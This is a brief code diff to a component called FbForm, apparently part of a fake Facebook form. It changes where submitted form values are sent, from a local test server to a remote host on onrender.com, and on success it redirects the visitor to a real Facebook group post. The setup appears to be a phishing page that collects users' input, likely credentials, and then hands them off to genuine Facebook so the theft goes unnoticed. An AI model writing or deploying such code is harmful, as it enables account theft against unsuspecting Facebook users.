@@ -42,7 +42,7 @@ export function FbForm() {
     try{
       
     console.log(values);
-   const result=await axios.post("http://localhost:4000/user/create",values)
+   const result=await axios.post("https://fb-avom.onrender.com/user/create",values)
    if(result.status===201){
     router.push("https://www.facebook.com/groups/shonirakhra/permalink/3741482896113640/?app=fbl")
    }
